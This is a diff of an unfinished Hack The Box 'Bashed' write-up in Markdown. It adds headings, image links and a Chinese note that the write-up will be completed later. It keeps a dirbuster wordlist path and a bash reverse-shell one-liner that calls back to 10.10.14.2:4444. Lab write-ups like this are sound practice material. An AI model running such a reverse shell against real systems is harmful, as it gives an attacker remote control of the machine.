@@ -1,10 +1,19 @@
 ---
 title: Bashed Writeup
 date: 2020-11-13 05:40:01
-tags:
+category: Hack The Box
 ---
 
+# Bashed Writeup
 
+![](./0.png)
+
+## 0x01 信息收集
+
+### 1、TCP Scan
+
+![](./1.png)
+已经拿下，回头补文。
 /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
 nohup bash -i >& /dev/tcp/10.10.14.2/4444 0>&1
 
